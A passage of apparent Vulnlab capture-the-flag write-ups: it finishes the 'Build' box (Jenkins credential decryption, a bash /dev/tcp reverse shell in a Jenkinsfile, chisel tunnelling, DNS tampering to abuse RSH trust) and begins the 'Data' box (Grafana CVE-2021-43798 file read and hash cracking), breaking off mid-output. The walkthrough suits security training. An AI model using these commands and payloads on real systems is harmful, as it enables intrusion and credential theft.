automatically.</p>\n<p>At this point the attack path becomes clear, we’ll need to compromise the <code>buildadm</code> account who has control over this repository and use it to place a reverse shell within the <code>Jenkinsfile</code>. From there, Jenkins should automatically execute this build along with our reverse shell.</p>\n<h1 id=\"RSYNC-File-Enumeration\"><a href=\"#RSYNC-File-Enumeration\" class=\"headerlink\" title=\"RSYNC File Enumeration\"></a>RSYNC File Enumeration</h1><p>Since there isn’t much else to check out on this webpage, let’s turn our attention to RSYNC. To those who aren’t aware, RSYNC s essentially a filesystem mounting&#x2F;share service. It allows administrators to copy files from one particular location in the filesystem to another, or allows them to mount it to a location similar to <code>NFS</code>. This is used if users need to have files copied to another location in a quick-manner. In our case, <code>rsync</code> is a tool that we can examine to determine if there are any files currently within the service that we can retrieve.</p>\n<p>We can list all of the currently archived files within RSYNC with one simple command as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rsync -av --list-only rsync://10.10.90.130</span><br><span class=\"line\">backups         backups</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there’s a <code>backups</code> archive within the contents of RSYNC filesystem, which we can download with the same <code>rsync</code> utility.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rsync -r 10.10.90.130::backups . </span><br><span class=\"line\">rsync: [receiver] write error: Broken pipe (32)</span><br><span class=\"line\">rsync error: received SIGINT, SIGTERM, or SIGHUP (code 20) at io.c(1700) [sender=3.2.7]</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ls</span><br><span class=\"line\">jenkins.tar.gz</span><br></pre></td></tr></table></figure>\n\n<p>The initial <code>rsync</code> download will take a long time as the archive is a big file. I’ve heard notice from some other people who were pen-testing this box that said the download itself took them almost 20 minutes to download. The key here is patience, it was finished in about 2-3 minutes for me.</p>\n<p>It should return a <code>jenkins.tar.gz</code>, which is a double compressed archive. We can decompress it with <code>tar -xvf jenkins.tar.gz</code>. Be prepared for a lot of output the screen.</p>\n<p>This returns the entire archive for the Jenkins application, which we’ll parse to see if any important information is within the filesystem here.</p>\n<p>So you’ll notice that there are a few interesting files in different parts of this filesystem. You’ll find a <code>secret.key</code> file in the root directory along with a <code>hudson.util.Secret</code> and <code>master.key</code> files within the <code>secrets</code> directory.</p>\n<p>Within <code>jenkins_configuration/users/admin_8569439066427679502</code>, you can find a <code>config.xml</code> file that seems to be related to the admin user. You’ll find a hash in this file for that same user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;/jenkins.model.experimentalflags.UserExperimentalFlagsProperty&gt;</span><br><span class=\"line\">    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;</span><br><span class=\"line\">      &lt;passwordHash&gt;#jbcrypt:$2a$10$PaXdGyit8MLC9CEPjgw15.6x0GOIZNAk2gYUTdaOB6NN/9CPcvYrG&lt;/passwordHash&gt;</span><br><span class=\"line\">    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;</span><br><span class=\"line\">    &lt;hudson.tasks.Mailer_-UserProperty plugin=&quot;mailer@472.vf7c289a_4b_420&quot;&gt;</span><br><span class=\"line\">      &lt;emailAddress&gt;admin@build.vl&lt;/emailAddress&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Although we aren’t relatively 100% confident, I do believe that these files must be linked somehow. I’ll do some research into these files to see if there’s any plaintext passwords we can retrieve from them.</p>\n<h1 id=\"Decrypting-Jenkins-Passwords\"><a href=\"#Decrypting-Jenkins-Passwords\" class=\"headerlink\" title=\"Decrypting Jenkins Passwords\"></a>Decrypting Jenkins Passwords</h1><p>I found a notable utility on GitHub that decrypts these types of passwords. You can find that <a href=\"https://github.com/hoto/jenkins-credentials-decryptor\">here</a>, and it involves using three types of files - the <code>master.key</code> file, the <code>hudson.util.Secret</code> file, and a <code>credentials.xml</code> file.</p>\n<p>The only odd part is that the <code>config.xml</code> file we have for the admin user does not seem to work with those two secret files we have. Which makes sense - this isn’t relative to the <code>buildadm</code> user that we are trying to access.</p>\n<p>I did a bit more poking around the archive and found a file that DOES seem to pertain to the <code>buildadm</code> user, underneath <code>/jenkins_configuration/jobs/build</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;id&gt;e4048737-7acd-46fd-86ef-a3db45683d4f&lt;/id&gt;</span><br><span class=\"line\">&lt;description&gt;&lt;/description&gt;</span><br><span class=\"line\">&lt;username&gt;buildadm&lt;/username&gt;</span><br><span class=\"line\">&lt;password&gt;&#123;AQAAABAAAAAQUNBJaKiUQNaRbPI0/VMwB1cmhU/EHt0chpFEMRLZ9v0=&#125;&lt;/password&gt;</span><br><span class=\"line\">&lt;usernameSecret&gt;false&lt;/usernameSecret&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Since we have all the required files needed to decrypt this hash, let’s move them all to our base directory for easier access.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ jenkins-credentials-decryptor/bin/jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml -o json</span><br><span class=\"line\">[</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    &quot;id&quot;: &quot;e4048737-7acd-46fd-86ef-a3db45683d4f&quot;,</span><br><span class=\"line\">    &quot;password&quot;: &quot;[...snip...]&quot;,</span><br><span class=\"line\">    &quot;username&quot;: &quot;buildadm&quot;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<p>It seems that this specific file decryption script was able to decrypt the password successfully. The password was returned in a JSON format as seen above, which we can now use to access the <code>buildadm</code> user on Gitea.</p>\n<h1 id=\"Build-RCE\"><a href=\"#Build-RCE\" class=\"headerlink\" title=\"Build -&gt; RCE\"></a>Build -&gt; RCE</h1><p>Now that we have access to this user on Gitea, we can take a look at the <code>Jenkinsfile</code> script within their repository.</p>\n<p><img src=\"/images/vulnlab/build-vl/d.png\"></p>\n<p>You can see the respective repository on the right side of the page, or we can access it as we did before in the <code>Explore</code> tab. </p>\n<p>Within the <code>Jenkinsfile</code>, we can select the <code>Edit</code> icon to the right of the file to alter it.</p>\n<p><img src=\"/images/vulnlab/build-vl/e.png\"></p>\n<p>The file itself contains a small script that seems to be running <code>sh &#39;/bin/true&#39;</code>. You can do some research onto <code>Jenkinsfiles</code> to see if there are any reverse shells that we can upload. I found however that you can enclose multiple line scripts within a directory block, to where I got the impression from <a href=\"https://stackoverflow.com/questions/38143485/how-do-i-make-jenkins-2-0-execute-a-sh-command-in-the-same-directory-as-the-chec\">here</a>.</p>\n<p>Let’s use a simple reverse shell to exploit this, you can find them on <a href=\"https://www.revshells.com/\">Revshells</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">pipeline &#123;</span><br><span class=\"line\">    agent any</span><br><span class=\"line\"></span><br><span class=\"line\">    stages &#123;</span><br><span class=\"line\">        stage(&#x27;Do nothing&#x27;) &#123;</span><br><span class=\"line\">            steps &#123;</span><br><span class=\"line\">                sh &#x27;&#x27;&#x27;</span><br><span class=\"line\">                bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/10.8.0.173/9001 0&gt;&amp;1&#x27;</span><br><span class=\"line\">                &#x27;&#x27;&#x27;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then start up a reverse shell and wait for this pipeline to execute after we save the file. I’m assuming that this is automated so we’ll need to wait probably a minute or two depending on how often the build is deployed.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nc -lvnp 9001       </span><br><span class=\"line\">listening on [any] 9001 ...</span><br><span class=\"line\">connect to [10.8.0.173] from (UNKNOWN) [10.10.90.130] 45014</span><br><span class=\"line\">bash: cannot set terminal process group (7): Inappropriate ioctl for device</span><br><span class=\"line\">bash: no job control in this shell</span><br><span class=\"line\">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main#</span><br></pre></td></tr></table></figure>\n\n<p>After a short amount of time after committing to the branch, you’ll see that we’ll receive a callback on our machine that generated a reverse shell.</p>\n<p>The user flag is within <code>/root</code>.</p>\n<h1 id=\"Chisel-Tunneling\"><a href=\"#Chisel-Tunneling\" class=\"headerlink\" title=\"Chisel Tunneling\"></a>Chisel Tunneling</h1><p>Given that we’re already root on this machine and we have only gotten a user flag, I’m assuming that we’re in a container of some sort. This along with the fact that the delimiter after our username on the TTY seems to be an odd string of characters.</p>\n<p>You’ll notice that we don’t have access to basic tools such as <code>netstat</code> or <code>ip</code>, which are generally installed by default on Linux machines. This solidifies my theory that we’re currently in a container, so we’ll need to perform a breakout to be able to access the actual machine. I’ll set up a <a href=\"https://github.com/BishopFox/sliver\">Sliver</a> C2 server so that we can enumerate the filesystem a little easier.</p>\n<p>So one thing as I mentioned before, we don’t have access to <code>netstat</code> or <code>ifconfig</code> due to the containers limitations, so we don’t know what the address is of this container. There is an alternative though, which is within <code>/proc/net/route</code>. This file shows all of the network interfaces and a hexadecimal version of their destination  and gateway IP addresses. There’s a way to decode this, which you can find <a href=\"https://www.browserling.com/tools/hex-to-ip\">here</a>.</p>\n<p>After decoding them, you’ll find that it’s backwards. The host seems to be <code>172.18.0.1</code>.</p>\n<p>Immediately though, I remembered that there was port 8081 and port 3306 running on this machine through a firewall. Although we are within a container, there’s a chance that we can still access these two ports remotely. We’ll use a tool called <a href=\"https://github.com/jpillora/chisel\">Chisel</a>, and attempt to redirect these services back to our localhost for us to access.</p>\n<p>You’ll need to upload the chisel binary to the container as well as have your own to start the server. We’ll use a socks proxy along with <code>proxychains4</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ./chisel server --reverse --port 8001            </span><br><span class=\"line\">2024/06/03 13:48:43 server: Reverse tunnelling enabled</span><br><span class=\"line\">2024/06/03 13:48:43 server: Fingerprint CrkDZ/Wi1k4tB14kgS3IOxLFVNgd4mQ/r/aKuFchUII=</span><br><span class=\"line\">2024/06/03 13:48:43 server: Listening on http://0.0.0.0:8001</span><br></pre></td></tr></table></figure>\n\n<p>Then on the remote machine, execute the chisel client to connect back to this server we just stood up.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (build) &gt; execute chisel client 10.8.0.173:8001 R:socks</span><br><span class=\"line\">[*] Command executed successfully</span><br></pre></td></tr></table></figure>\n\n<p>You’ll need to edit your <code>/etc/proxychains4.conf</code> to reflect on the address that the socks proxy is listening on. This generally is on port 1080&#x2F;1081, the chisel server output should give you the answer.</p>\n<p>Now that we’re tunneled directly to the machine, we can attempt to access the MySQL database on our Kali machine by using <code>proxychains</code>.</p>\n<h1 id=\"Enumerating-MySQL\"><a href=\"#Enumerating-MySQL\" class=\"headerlink\" title=\"Enumerating MySQL\"></a>Enumerating MySQL</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 -q mysql -u root -h 172.18.0.1 -p</span><br><span class=\"line\">Enter password: </span><br><span class=\"line\">Welcome to the MariaDB monitor.  Commands end with ; or \\g.</span><br><span class=\"line\">Your MariaDB connection id is 51</span><br><span class=\"line\">Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution</span><br><span class=\"line\"></span><br><span class=\"line\">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class=\"line\"></span><br><span class=\"line\">Support MariaDB developers by giving a star at https://github.com/MariaDB/server</span><br><span class=\"line\">Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the current input statement.</span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [(none)]&gt; </span><br></pre></td></tr></table></figure>\n\n<p>After a bit of enumeration, I found a hash for <code>PowerDNS</code> within the <code>powerdnsadmin</code> database underneath the <code>user</code> table. This specific hash seems to be encoded with <code>bcrypt</code>, as denoted by the <code>$2b$</code> delimiter.</p>\n<p><code>JTR</code> can do the heavy lifting for us in this case, to which I also made sure to place this hash within its own text file.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ john powerdns.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class=\"line\">Cost 1 (iteration count) is 4096 for all loaded hashes</span><br><span class=\"line\">Will run 4 OpenMP threads</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">[...snip...]          (?)     </span><br><span class=\"line\">1g 0:00:01:18 DONE (2024-06-03 14:18) 0.01270g/s 16.92p/s 16.92c/s 16.92C/s winston..incubus</span><br><span class=\"line\">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the hash to PowerDNS, we’ll need to find a way to access its resources to be able to login.</p>\n<p>If you try to access port <code>8081</code> through a reverse port forward (outlined below):</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (build) &gt; execute chisel client 10.8.0.173:8002 R:8081:127.0.0.1:8081</span><br></pre></td></tr></table></figure>\n\n<p>You’ll find that you can’t access the resources that simply. If you think about, we’re currently using the gateway of the container, however we aren’t able to simple just access the resources from this gateway. The ports themselves are forwarded from different machines across the <code>172</code> subnet.</p>\n<p>To get more of what I mean, you can refer to the <code>records</code> table within the MySQL <code>powerdnsadmin</code> database to see the IP range of this machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MariaDB [powerdnsadmin]&gt; select * from records;</span><br><span class=\"line\">+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span><br><span class=\"line\">| id | domain_id | name                 | type | content                                                                                  | ttl  | prio | disabled | ordername | auth |</span><br><span class=\"line\">+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span><br><span class=\"line\">|  8 |         1 | db.build.vl          | A    | 172.18.0.4                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">|  9 |         1 | gitea.build.vl       | A    | 172.18.0.2                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">| 10 |         1 | intern.build.vl      | A    | 172.18.0.1                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">| 11 |         1 | jenkins.build.vl     | A    | 172.18.0.3                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">| 12 |         1 | pdns-worker.build.vl | A    | 172.18.0.5                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">| 13 |         1 | pdns.build.vl        | A    | 172.18.0.6                                                                               |   60 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">| 14 |         1 | build.vl             | SOA  | a.misconfigured.dns.server.invalid hostmaster.build.vl 2024050201 10800 3600 604800 3600 | 1500 |    0 |        0 | NULL      |    1 |</span><br><span class=\"line\">+----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span><br><span class=\"line\">7 rows in set (0.148 sec)</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the PowerDNS admin service seems to be running on either <code>.05</code> or <code>.06</code>. We can run a simple bash loop to determine which is which.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ for i in &#123;5..6&#125;; do proxychains4 -q nmap -p8081 172.18.0.$i; done</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 14:33 EDT</span><br><span class=\"line\">Nmap scan report for 172.18.0.5</span><br><span class=\"line\">Host is up (0.57s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">8081/tcp open  blackice-icecap</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 1.54 seconds</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 14:33 EDT</span><br><span class=\"line\">Nmap scan report for 172.18.0.6</span><br><span class=\"line\">Host is up (0.68s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE  SERVICE</span><br><span class=\"line\">8081/tcp closed blackice-icecap</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds</span><br></pre></td></tr></table></figure>\n\n<p>It seems that the access point is on <code>.05</code>. Let’s try to access it through our web browser. We’ll need to use FoxyProxy and tunnel it through our SOCKS proxy in order to access the website. If we tried to do this without a web proxy, we wouldn’t be able to reach the machine.</p>\n<p><img src=\"/images/vulnlab/build-vl/f.png\"></p>\n<p>Once that’s up and running, be sure to enable it.</p>\n<p>You’ll come into an issue that seems to prevent you from accessing the PowerDNS admin page. This is due to the fact that this is actually behind another firewall. However, if you were to run another NMAP scan against <code>172.18.0.6</code>, you’ll find that there’s actually a web server running on that port.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-03 15:29 EDT</span><br><span class=\"line\">Nmap scan report for 172.18.0.6</span><br><span class=\"line\">Host is up (0.33s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE  SERVICE</span><br><span class=\"line\">80/tcp   open   http</span><br><span class=\"line\">8081/tcp closed blackice-icecap</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"DNS-Record-Manipulation\"><a href=\"#DNS-Record-Manipulation\" class=\"headerlink\" title=\"DNS Record Manipulation\"></a>DNS Record Manipulation</h1><p>We can try to access the webserver through our web proxy, and it should land us at the PowerDNS login.</p>\n<p><img src=\"/images/vulnlab/build-vl/g.png\"></p>\n<p>Let’s now login with the <code>admin</code> creds that we cracked earlier. This should bring you to the dashboard for PowerDNS, to which you can access the Zone Records pane to view the DNS records for <code>build.vl</code>.</p>\n<p><img src=\"/images/vulnlab/build-vl/h.png\"></p>\n<p>Now that we have access to the zone records for this domain specifically, there’s a bit of misconfiguration that we can exploit.</p>\n<p>If you remember from before, there were ports <code>512-514</code> that were designated to the RSH service. This is essentially a much more insecure version of SSH, which in some cases can allow for unauthorized login as the root user if misconfigured. You can find more information about this <a href=\"https://www.ssh.com/academy/ssh/rsh\">here</a>.</p>\n<p>The interesting note about this is that the specific DNS servers that are able to access RSH are designated within a <code>.rhosts</code> file. This file was within the <code>/root</code> directory of the container that we previously had access to, and contained the following contents.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@5ac6c7d6fb8e:~# cat .rhosts</span><br><span class=\"line\">admin.build.vl +</span><br><span class=\"line\">intern.build.vl +</span><br></pre></td></tr></table></figure>\n\n<p>This means that the RSH client trusts both <code>intern</code> and <code>admin</code>, though you’ll see that only <code>intern</code> is configured.</p>\n<p>If we configure <code>admin</code> to point to our IP address, of our Kali machine, then we should theoretically be able to authenticate through RSH to the machine.</p>\n<p><img src=\"/images/vulnlab/build-vl/i.png\"></p>\n<h1 id=\"Misconfigured-RSH-Login\"><a href=\"#Misconfigured-RSH-Login\" class=\"headerlink\" title=\"Misconfigured RSH Login\"></a>Misconfigured RSH Login</h1><p>Now that it’s configured, let’s try to use <code>rlogin</code> to authenticate as the root user to the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ rlogin root@10.10.94.174</span><br><span class=\"line\">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)</span><br><span class=\"line\">......</span><br><span class=\"line\">root@build:~#</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that it authenticated us properly, and we were able to access the <code>build</code> machine. Given that we now have access to this, you’ll actually notice that the directory <code>/root/scripts/root/</code> is a mount of the root directory of the container.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@build:~/scripts/root# ls -la</span><br><span class=\"line\">total 17884</span><br><span class=\"line\">drwxr-xr-x 3 root root    4096 Jun  3 19:23 .</span><br><span class=\"line\">drwxr-xr-x 6 root root    4096 May  2 15:35 ..</span><br><span class=\"line\">lrwxrwxrwx 1 root root       9 May  1 14:37 .bash_history -&gt; /dev/null</span><br><span class=\"line\">-rwxrwxrwx 1 root root 9637888 Jun  3 19:23 build</span><br><span class=\"line\">-rwxrwxrwx 1 root root 8654848 Jun  3 19:23 chisel</span><br><span class=\"line\">-r-------- 1 root root      35 May  1 17:37 .rhosts</span><br><span class=\"line\">drwxr-xr-x 2 root root    4096 May  1 16:05 .ssh</span><br><span class=\"line\">-rw------- 1 root root      37 May  1 14:29 user.txt</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, this further solidifies the fact that this machine had access to the container through RSH by utilizing the <code>.rhosts</code> file. If this specific file had not been within this directory, there’s a chance we would’ve never been able to exploit this without altering the web contents of a container that we had access to and that we knew WAS connected to the machine.</p>\n<p>This specific vulnerability was just a misconfiguration on the <code>intern</code> users part, which could’ve been due to wanting the main machine to be able to authenticate through RSH to the container.</p>\n<p>Nonetheless, now that we have access to root on the main machine, we can view the root flag in <code>/root/root.txt</code>. This means we have successfully completed this machine!</p>\n<p><img src=\"/images/vulnlab/build-vl/j.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was probably the longest I’ve done, and it took a lot of brainstorming as to what the next part of the attack path was. I’ve always struggled with machines that are heavy on web-app exploits, so this was great learning material to practice. Big thank you to xct for the development of this machine!</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://dan-feliciano.com/writeups/sync/\">https://dan-feliciano.com/writeups/sync/</a><br><a href=\"https://www.speedguide.net/port.php?port=3000\">https://www.speedguide.net/port.php?port=3000</a><br><a href=\"https://github.com/go-gitea/gitea\">https://github.com/go-gitea/gitea</a><br><a href=\"https://www.jenkins.io/doc/book/pipeline/jenkinsfile/\">https://www.jenkins.io/doc/book/pipeline/jenkinsfile/</a><br><a href=\"https://github.com/hoto/jenkins-credentials-decryptor\">https://github.com/hoto/jenkins-credentials-decryptor</a><br><a href=\"https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76\">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://stackoverflow.com/questions/48316346/gitea-and-jenkins-webhook\">https://stackoverflow.com/questions/48316346/gitea-and-jenkins-webhook</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://github.com/jpillora/chisel\">https://github.com/jpillora/chisel</a><br><a href=\"https://www.ssh.com/academy/ssh/rsh\">https://www.ssh.com/academy/ssh/rsh</a></p>\n"},{"title":"Data - Vulnlab","date":"2024-06-05T05:51:34.000Z","keywords":"Vulnlab, Easy, Linux","description":"Data was another interesting machine that involved interacting with a Grafana web service and utilizing web-app exploits to gain access to a docker container. This is the first writeup that I've written that exploits docker breakout, so I hope I'll be able to explain it properly.","cover":"/images/vulnlab/data-vl/data_slide.png","top_img":"/images/cyberpunk-red.jpg","toc":true,"toc_number":false,"_content":"\nData was another interesting machine that involved interacting with a Grafana web service and utilizing web-app exploits to gain access to a docker container. This is the first writeup that I've written that exploits docker breakout, so I hope I'll be able to explain it properly. \n\n# Enumeration\n\nLet's start with a basic NMAP scan.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 12:15 EDT\nNmap scan report for 10.10.64.184\nHost is up (0.12s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n3000/tcp open  ppp\n\nNmap done: 1 IP address (1 host up) scanned in 17.08 seconds\n```\n\nGiven that the only other port is SSH, we'll look towards port `3000` for the start of our attack path. You can find information about this specific port [here](https://www.speedguide.net/port.php?port=3000), which it seems as though that we are able to access it through HTTP based off an aggressive scan I ran afterwards.\n\n![](/images/vulnlab/data-vl/b.jpg)\n\nThis brings us to a Grafana landing page, one of the services that was listed on this port through the article I referenced earlier. The version of this application is `v8.0.0`, meaning we could potentially look for exploits for this specific version.\n\nAs for the service itself, Grafana seems to be a web application used for data visualization. While we're currently interacting with a login panel, authenticated users will be met with a framework/GUI that allows them to configure imported data from databases such as SQL. You can find more information about the service via the documentation [here](https://grafana.com/docs/grafana/latest/introduction/).\n\n# LFI via Plugins\n\nI did some research into this specific version `v8.0.0`, and it seems as though this is vulnerable to arbitrary file read via [CVE-2021-43798](https://github.com/wagneralves/CVE-2021-43798/tree/main). This essentially allows us to traverse through the website's root filesystem directly through the URL. The POC that I referenced does this manually for us - so we'll use it to determine if we can access to any files.\n\n```\n└─$ ./ExploitGrafana.sh -h http://10.10.64.184:3000 -f /etc/passwd\nPlugin alertlist Status code 200:\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.10.64.184:3000...\n* Connected to 10.10.64.184 (10.10.64.184) port 3000\n> GET /public/plugins/alertlist/../../../../../../../../../../../../..//etc/passwd HTTP/1.1\n> Host: 10.10.64.184:3000\n> User-Agent: curl/8.7.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n```\n\nIt seems as though we were able to get a `200` response from the path traversal. You can see the GET request in the markdown above, and at the bottom of this commands output should be the `/etc/passwd` file of the machine. This confirms that the POC works and that the website is vulnerable.\n\nThat being said, we'll still need to be able to use this vulnerability to find credentials. This HackTricks [article](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grafana) outlines a default file that we can grab that should have valid credentials to the website if it was installed with no further maintenance. The file that we are looking for is under `/var/lib/grafana/grafana.db`, the internal Grafana SQLITE database.\n\nWe can grab this easily with cURL, and we can save it to a file locally using `--output` to prevent it from being outputted to the terminal.\n\n```\n└─$ curl http://10.10.64.184:3000/public/plugins/alertlist/../../../../../../../../../..//var/lib/grafana/grafana.db --path-as-is --output grafana.db\n\n└─$ ls\nExploitGrafana.sh  README.md  grafana.db\n```\n\nNow that we have the Grafana database locally, we can read it with `sqlite3` and use `.dump` to dump out all the contents of the database.\nAlternatively, we can determine the specific table we want to look at by running `.tables`, which will tell us that there is a `user` table. We can then run `SELECT * from user;` to dump this table and all of its contents.\n\n```\nsqlite> SELECT * FROM user;\n1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0\n2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0\n```\n\n# Cracking Grafana Hashes\n\n```\nsqlite> select name,password,salt from user;\n|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S\nboris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl\n```\n\nIt seems that we were able to dump the passwords, though they're in an odd format. If you'll notice, we have the password to the user's `boris` and `admin`, along with what looks to be a salt. Simply putting the password into a hash-identifier will not produce any results, we'll need to crack this hash given the salt.\n\nDoing some more research, I found an article [here](https://vulncheck.com/blog/grafana-cve-2021-43798) that explains a bit about the hashing algorithm that Grafana uses for this database. That is, at least for this version that we're currently on. It seems that the algorithm is just encoding the password and salts in Base64 before putting them after the `sha256:10000` identifier. Based on the article, the salt's are simply passed through a standard base64 encoding, which we can encode by using [CyberChef](https://gchq.github.io/CyberChef/).\n\nThe same cannot be said for the password, as the hexadecimal bytes of the plaintext password are passed into the base64 encoding. I created a little snippet of code that does this for us using Python.\n\n```Python\nimport binascii\nimport base64\n\nhashed_password = \"dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8\"\ndecoded_pass = bytes.fromhex(hashed_password)\nb64_enc = base64.b64encode(decoded_pass).decode('utf-8')\n\nprint(b64_enc)\n```\n\nAfter running the Python file above, we'll receive the proper base64 encoding of the password. We can now format the password locally in order to use it with Hashcat.\n\n```\nsha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=\n```\n\nThe specific hash identifier for `PBKDF2-HMAC-SHA256` can be found on Hashcat's documentation [here](https://hashcat.net/wiki/doku.php?id=example_hashes). The identifier we're looking for is `10900`.\n\n```\n└─$ hashcat -a 0 -m 10900 boris.txt /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.6) 